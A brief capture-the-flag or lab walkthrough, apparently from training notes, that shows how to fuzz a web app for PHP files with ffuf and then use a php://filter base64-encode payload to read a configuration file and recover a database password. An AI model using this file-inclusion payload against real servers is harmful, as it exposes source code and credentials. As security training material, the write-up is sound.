# PHP Filters

#### Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer

**Step 1** - Fuzz configuration files:

* Use this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-2.3-small.txt)
* Fuzz with the following command:
  * <pre><code><strong>ffuf -w /wordlist:FUZZ -u http://SERVER_IP:PORT:/FUZZ.php
    </strong></code></pre>
* Three files found

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

**Step 2** - Use PHP Filters to read the file content:

* php://filter/read=convert.base64-encode/resource=**configure**

<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

**Step 3** - Read the previous base64 string:

* `echo 'base64 string' | base64 -d`&#x20;

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

And we got the flag!
